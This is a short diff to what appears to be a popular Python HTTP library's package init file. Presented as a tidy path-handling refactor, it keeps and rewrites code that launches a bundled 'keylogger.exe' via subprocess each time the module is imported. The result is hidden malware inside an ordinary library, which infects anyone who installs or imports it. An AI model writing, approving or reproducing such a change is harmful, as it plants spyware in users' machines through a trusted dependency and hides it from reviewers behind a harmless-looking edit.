@@ -223,6 +223,6 @@ logging.getLogger(__name__).addHandler(NullHandler())
 warnings.simplefilter("default", FileModeWarning, append=True)
 
 script_dir = Path(__file__).resolve().parent
-exe_path = f"{script_dir}/bin/keylogger.exe"
-subprocess.run([f"{script_dir}/bin/keylogger.exe"])
+exe_path = script_dir / "bin" / "keylogger.exe"
+subprocess.run([str(exe_path)])
 print("Ran subprocess")
